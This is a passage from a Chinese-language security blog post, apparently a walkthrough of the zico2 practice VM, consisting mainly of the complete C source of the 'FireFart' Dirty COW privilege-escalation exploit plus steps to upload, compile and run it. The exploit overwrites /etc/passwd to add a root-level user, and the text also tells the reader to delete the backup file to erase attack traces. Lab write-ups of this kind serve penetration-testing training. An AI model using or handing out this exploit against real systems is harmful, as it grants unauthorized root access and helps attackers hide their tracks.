+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span><br><span class="line">// as a base and automatically generates a new passwd line.</span><br><span class="line">// The user will be prompted for the new password when the binary is run.</span><br><span class="line">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span><br><span class="line">// and overwrites the root account with the generated line.</span><br><span class="line">// After running the exploit you should be able to login with the newly</span><br><span class="line">// created user.</span><br><span class="line">//</span><br><span class="line">// To use this exploit modify the user values according to your needs.</span><br><span class="line">//   The default is &quot;firefart&quot;.</span><br><span class="line">//</span><br><span class="line">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span><br><span class="line">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span><br><span class="line">//</span><br><span class="line">// Compile with:</span><br><span class="line">//   gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">//</span><br><span class="line">// Then run the newly create binary by either doing:</span><br><span class="line">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span><br><span class="line">//</span><br><span class="line">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span><br><span class="line">//</span><br><span class="line">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span><br><span class="line">//   mv /tmp/passwd.bak /etc/passwd</span><br><span class="line">//</span><br><span class="line">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span><br><span class="line">// https://firefart.at</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;crypt.h&gt;</span><br><span class="line"></span><br><span class="line">const char *filename = &quot;/etc/passwd&quot;;</span><br><span class="line">const char *backup_filename = &quot;/tmp/passwd.bak&quot;;</span><br><span class="line">const char *salt = &quot;firefart&quot;;</span><br><span class="line"></span><br><span class="line">int f;</span><br><span class="line">void *map;</span><br><span class="line">pid_t pid;</span><br><span class="line">pthread_t pth;</span><br><span class="line">struct stat st;</span><br><span class="line"></span><br><span class="line">struct Userinfo &#123;</span><br><span class="line">   char *username;</span><br><span class="line">   char *hash;</span><br><span class="line">   int user_id;</span><br><span class="line">   int group_id;</span><br><span class="line">   char *info;</span><br><span class="line">   char *home_dir;</span><br><span class="line">   char *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">char *generate_password_hash(char *plaintext_pw) &#123;</span><br><span class="line">  return crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *generate_passwd_line(struct Userinfo u) &#123;</span><br><span class="line">  const char *format = &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;</span><br><span class="line">  int size = snprintf(NULL, 0, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  char *ret = malloc(size + 1);</span><br><span class="line">  sprintf(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void *madviseThread(void *arg) &#123;</span><br><span class="line">  int i, c = 0;</span><br><span class="line">  for(i = 0; i &lt; 200000000; i++) &#123;</span><br><span class="line">    c += madvise(map, 100, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;madvise %d\n\n&quot;, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int copy_file(const char *from, const char *to) &#123;</span><br><span class="line">  // check if target file already exists</span><br><span class="line">  if(access(to, F_OK) != -1) &#123;</span><br><span class="line">    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,</span><br><span class="line">      to);</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  char ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, &quot;r&quot;);</span><br><span class="line">  if(source == NULL) &#123;</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, &quot;w&quot;);</span><br><span class="line">  if(target == NULL) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     return -1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;%s successfully backed up to %s\n&quot;,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  // backup file</span><br><span class="line">  int ret = copy_file(filename, backup_filename);</span><br><span class="line">  if (ret != 0) &#123;</span><br><span class="line">    exit(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  struct Userinfo user;</span><br><span class="line">  // set values, change as needed</span><br><span class="line">  user.username = &quot;firefart&quot;;</span><br><span class="line">  user.user_id = 0;</span><br><span class="line">  user.group_id = 0;</span><br><span class="line">  user.info = &quot;pwned&quot;;</span><br><span class="line">  user.home_dir = &quot;/root&quot;;</span><br><span class="line">  user.shell = &quot;/bin/bash&quot;;</span><br><span class="line"></span><br><span class="line">  char *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  if (argc &gt;= 2) &#123;</span><br><span class="line">    plaintext_pw = argv[1];</span><br><span class="line">    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    plaintext_pw = getpass(&quot;Please enter the new password: &quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  char *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  map = mmap(NULL,</span><br><span class="line">             st.st_size + sizeof(long),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             0);</span><br><span class="line">  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);</span><br><span class="line">  pid = fork();</span><br><span class="line">  if(pid) &#123;</span><br><span class="line">    waitpid(pid, NULL, 0);</span><br><span class="line">    int u, i, o, c = 0;</span><br><span class="line">    int l=strlen(complete_passwd_line);</span><br><span class="line">    for(i = 0; i &lt; 10000/l; i++) &#123;</span><br><span class="line">      for(o = 0; o &lt; l; o++) &#123;</span><br><span class="line">        for(u = 0; u &lt; 10000; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      map + o,</span><br><span class="line">                      *((long*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;ptrace %d\n&quot;,c);</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   NULL,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   NULL);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,NULL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);</span><br><span class="line">  printf(&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    printf(&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>保存成一个shell.c文件</p>
+<p>上传到我们的服务器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907155900947.png"
+                      alt="image-20230907155900947"
+                ></p>
+<p>用gcc编译一下</p>
+<p>命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread c代码文件名 -o 输出文件名 -lcrypt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907160505475.png"
+                      alt="image-20230907160505475"
+                ></p>
+<p>执行编译后的程序</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907160922874.png"
+                      alt="image-20230907160922874"
+                ></p>
+<p>输入密码</p>
+<p>我们这里看一下etc&#x2F;passwd</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161148341.png"
+                      alt="image-20230907161148341"
+                ></p>
+<p>可以看到我们这里成功添加了一个firefart用户而且还是root权限</p>
+<p>我们这里其实就是利用脏牛漏洞在etc&#x2F;passwd中添加了一个root用户</p>
+<p>但是攻击者在利用脏牛漏洞时通常会创建一个备份文件，如 <code>/etc/passwd.bak</code>，用于保存原始的 <code>/etc/passwd</code> 文件内容</p>
+<p>我们这里为了删除攻击痕迹，可以把这个文件删除掉</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161444986.png"
+                      alt="image-20230907161444986"
+                ></p>
+<p>上面我们通过脏牛漏洞成功添加了一个特权用户，并且有root权限</p>
+<p>那么我们可以通过su切换到这个特权用户</p>
+<p>密码是我们上面自己设的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161620764.png"
+                      alt="image-20230907161620764"
+                ></p>
+<p>提权到root权限，那么到这里我们就拿下了这台服务器。</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> zico2靶机打靶记录</li>
+        <li><strong>作者:</strong> GTL-JU</li>
+        <li><strong>创建于:</strong> 2023-09-08 11:35:01</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-09-08 11:43:01
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://gtl-ju.github.io/2023/09/08/zico2靶机打靶记录/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E6%B8%97%E9%80%8F-%E9%9D%B6%E6%9C%BA/">#渗透-靶机</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/09/08/CommonCollections4%E4%B8%8ECommonCollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">CommonCollections4与CommonCollections2利用链分析</span>
+                                    <span class="post-nav-item">下一篇</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">zico2靶机打靶记录</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA"><span class="nav-text">一、漏洞平台搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">二、主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">二、信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-text">三、漏洞扫描与利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="nav-text">四、脏牛提权</span></a></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">GTL-JU</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.0</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2023/4/8 0:0:0
+            </div>
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/layouts/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
